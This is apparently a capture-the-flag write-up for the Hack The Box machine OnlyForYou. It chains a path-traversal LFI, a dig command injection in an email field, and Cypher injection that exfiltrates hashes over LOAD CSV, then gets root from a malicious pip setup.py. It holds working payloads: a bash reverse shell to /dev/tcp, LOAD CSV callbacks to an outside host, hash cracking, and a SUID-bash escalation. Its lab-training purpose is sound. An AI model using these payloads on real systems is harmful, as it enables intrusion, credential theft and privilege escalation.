---
layout: post
title: "HTB: OnlyForYou"
subtitle: "LFI to source leak, dig command injection for a shell, Cypher injection for creds, then a malicious pip sdist to root"
date: 2023-04-30
tags: [htb, linux, lfi, command-injection, cypher-injection, pip]
category: writeups
kind: machine
tldr: "A weak path-traversal check on beta.only4you.htb leaks the app source. form.py runs dig with shell=True, so I inject through the email field for a shell as www-data. An internal neo4j is hit with Cypher injection to dump john's hash (ThisIs4You), and sudo pip3 download of an attacker-hosted sdist runs setup.py as root for the escape."
---

## the box

OnlyForYou is a Linux box themed around Python and neo4j. Two bugs are the same bug twice, a Python standard-library function used with the wrong mental model. `os.path.join` silently throws away everything before an absolute path, which turns a traversal filter into an LFI. `re.match` only anchors the start of a string, which turns an email validator into a command-injection gateway. After that it is a chisel pivot to internal services, a Cypher injection that exfiltrates over `LOAD CSV`, and the well-known `pip download` setup.py execution for root.

Two ports:

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http  nginx 1.18.0 (Ubuntu)
```

## recon

Wide scan, then service detection:

```bash
nmap -p- --min-rate 10000 10.129.54.20
nmap -p 22,80 -sCV 10.129.54.20
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Port `80` redirects to `only4you.htb`, so the box uses name-based vhosts. I added the hostname, and the beta one I find next, to `/etc/hosts`:

```
10.129.54.20 only4you.htb beta.only4you.htb
```

The main site is a OnePage template (v4.9.0) with a contact form and not much else. One line points at a second product:

```
We have some beta products to test. You can check it here -> http://beta.only4you.htb
```

The beta vhost is an image-tools app. Content discovery against it returns a small set of routes:

```
/download   (405)
/list       (200)
/source     (200)
/convert    (200)
/resize     (200)
```

`/source` hands out the application's own source code as a zip, which makes this a whitebox read of beta from here on. `/resize` and `/convert` both validate uploads by extension against an allowlist:

```python
file = request.files['file']
img = secure_filename(file.filename)
if img != '':
    ext = os.path.splitext(img)[1]
    if ext not in app.config['UPLOAD_EXTENSIONS']:
        flash('Only png and jpg images are allowed!', 'danger')
        return redirect(request.url)
    file.save(os.path.join(app.config['RESIZE_FOLDER'], img))
```

That is tight enough to skip. The interesting route is `/download`:

```python
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image)
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    # ... serve filename
```

The check only rejects `..` anywhere in the name or a leading `../`. It never blocks an absolute path. And the next line only prepends the safe `LIST_FOLDER` when the path is not already absolute. The reason that matters is `os.path.join`: if any later component is an absolute path, Python discards every component before it. So `os.path.join(LIST_FOLDER, '/etc/passwd')` evaluates to `/etc/passwd`. An absolute `image` value sails through the filter and reads any file. This is a clean LFI:

```bash
curl -s http://beta.only4you.htb/download -d 'image=/etc/passwd'
```

```
root:x:0:0:root:/root:/bin/bash
...
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

Real users `dev`, `john`, `root`, plus a `neo4j` service account. With arbitrary read I pulled the nginx config to map both vhosts to their unix sockets, which tells me where the main app's source lives:

```bash
curl -s http://beta.only4you.htb/download -d 'image=/etc/nginx/sites-enabled/default'
```

```
server { listen 80; server_name only4you.htb;
    location / { proxy_pass http://unix:/var/www/only4you.htb/only4you.sock; } }
server { listen 80; server_name beta.only4you.htb;
    location / { proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock; } }
```

Then the main app's `app.py` and the helper it imports, `form.py`:

```bash
curl -s http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/app.py'
curl -s http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/form.py'
```

## foothold

`app.py` passes the contact form's `email` straight to `sendmessage`, which calls `issecure`. Inside `issecure`, `form.py` builds a `dig` command from the email domain and runs it with `shell=True`:

```python
def issecure(email, ip):
    if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
        return 0
    else:
        domain = email.split("@", 1)[1]
        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
        ...
```

The domain is the part of the email after `@`, dropped into a shell string. Two things make this exploitable. First, `shell=True` with an f-string is textbook command injection, anything in `domain` after a `;` runs. Second, the only guard is the `re.match` email check, and `re.match` anchors only the start of the string with no `$` at the end of that pattern. So a valid-looking prefix passes, and everything after it is unvalidated. `tester@mailroom.htb; <command>` matches the regex at the front and carries my command at the back.

I reproduced the exact code path locally first to be sure of the quoting before sending anything to the box:

```python
from subprocess import PIPE, run
email = input("enter mail: ")
domain = email.split("@", 1)[1]
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
print(result.stdout.decode())
```

With a real address prefix, a `;`, and a bash reverse shell after it, it executed. Then I posted the same payload to the contact endpoint on `only4you.htb` (URL-encoded), listener up on `8085`:

```
name=test&email=tester%40mailroom.htb%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.147/8085+0>%261'&subject=eztzet&message=zeteztzet
```

That gave a reverse shell as `www-data`.

## user

On the box, the listening sockets show several internal services bound to loopback that are not exposed externally:

```bash
ss -tlnp
```

```
127.0.0.1:3000     gogs (git service)
127.0.0.1:8001     internal admin web app
127.0.0.1:7687     neo4j Bolt
127.0.0.1:7474     neo4j HTTP
```

To reach them from my box I pivoted with chisel. Server on my side, client on the box pushing the two ports I care about back through the tunnel:

```bash
# attacker
./chisel server -p 8000 --reverse
# on target
./chisel client 10.10.16.5:8000 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000
```

The internal app on `8001` logs in with `admin:admin`. Its employee `/search` endpoint runs a Cypher query against neo4j and is injectable. neo4j has no UNION-style stacking for exfil, so the standard trick is `LOAD CSV FROM`, which makes the database issue an HTTP request to a URL I control, smuggling the data out in the query string. I started an HTTP handler to catch the callbacks:

```bash
python3 -m http.server 9999
```

Version first, to confirm injection and know what I am hitting:

```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.5:9999/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

```
"GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1"
```

Then the node labels, to know what to query:

```
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.5:9999/?label='+label as l RETURN 0 as _0 //
```

```
"GET /?label=user"
"GET /?label=employee"
```

Then every property of the `user` nodes, unwinding keys so I get field names and values:

```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.5:9999/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

My handler caught the usernames and password hashes:

```
"GET /?username=admin"
"GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"
"GET /?username=john"
"GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6"
```

Both are unsalted SHA-256, so they crack instantly. admin's hash is just the word `admin`. john's I ran with hashcat mode `1400`, though a rainbow table like CrackStation returns it just as fast since there is no salt:

```bash
hashcat -a 0 -m 1400 hash /usr/share/seclists/rockyou.txt
```

john's password is `ThisIs4You`, reused for SSH:

```bash
ssh john@only4you.htb   # ThisIs4You
```

That is the user flag.

## root

`sudo -l` as john:

```
User john may run the following commands:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

john can run `pip3 download` as root, but only against a `.tar.gz` served by the internal Gogs on `3000`. The trap here is that `pip download` is not a passive fetch. For a source distribution, pip still builds the package to read its metadata, and building runs the package's `setup.py`. So a malicious sdist runs arbitrary code as root the moment root downloads it, no install needed. My `setup.py` overrides the `egg_info` and `install` commands to SUID bash:

```python
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("chmod u+s /bin/bash")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "Backage",
    version = "0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

Build the sdist:

```bash
python3 setup.py sdist
```

The sudo rule pins the source to Gogs on `3000`, so I needed the tarball hosted there. I registered an account on the tunneled Gogs (`admin:admin` works, or a fresh signup), created a repo, and pushed the built `Backage-0.1.tar.gz` so it is reachable at a raw URL. Then I had root pull it:

```bash
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Backage/raw/master/Backage-0.1.tar.gz
```

pip resolves the sdist, builds it, the overridden `egg_info` runs as root, and `/bin/bash` comes back wearing the SUID bit. `bash -p` keeps the effective UID and drops to a root shell:

```bash
ls -la /bin/bash
bash -p
```

```
-rwsr-xr-x 1 root root ... /bin/bash
bash-5.0# id
uid=1000(john) euid=0(root) ...
```

That is the root flag.

## takeaway

The path-traversal check fails because it only thinks about `..` and forgets absolute paths, and `os.path.join` quietly does the rest, which leaks the whole app and points at the real bug. The email validator fails the same way, an unanchored `re.match` that only inspects the start of the string. Building shell strings from user input with `shell=True` is the foothold, and Cypher injection plus `LOAD CSV` turns a search box into an out-of-band exfil channel against a database that has no UNION. The privesc is the standard `pip download` setup.py execution. Downloading is not safe, because building an sdist runs its code, and the sudo rule that tried to scope the source to a trusted host did nothing once that host was attacker-writable.
